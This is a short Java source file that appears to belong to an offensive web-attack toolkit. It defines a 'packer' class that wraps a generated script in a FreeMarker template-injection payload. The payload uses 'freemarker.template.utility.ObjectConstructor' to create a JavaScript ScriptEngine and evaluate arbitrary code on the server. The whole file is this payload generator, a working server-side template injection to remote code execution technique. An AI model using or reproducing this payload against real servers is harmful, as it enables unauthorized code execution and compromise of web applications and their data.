package com.reajason.javaweb.packer.freemarker;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.scriptengine.ScriptEnginePacker;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.FreemarkerScriptEngine, parent = Packers.Freemarker, order = 1710)
public class FreemarkerScriptEnginePacker implements Packer {
    String template = "${'freemarker.template.utility.ObjectConstructor'?new()('javax.script.ScriptEngineManager').getEngineByName('js').eval('{{script}}')}";

    @Override
    public String pack(ClassPackerConfig config) {
        String script = new ScriptEnginePacker().pack(config);
        return template.replace("{{script}}", script);
    }
}
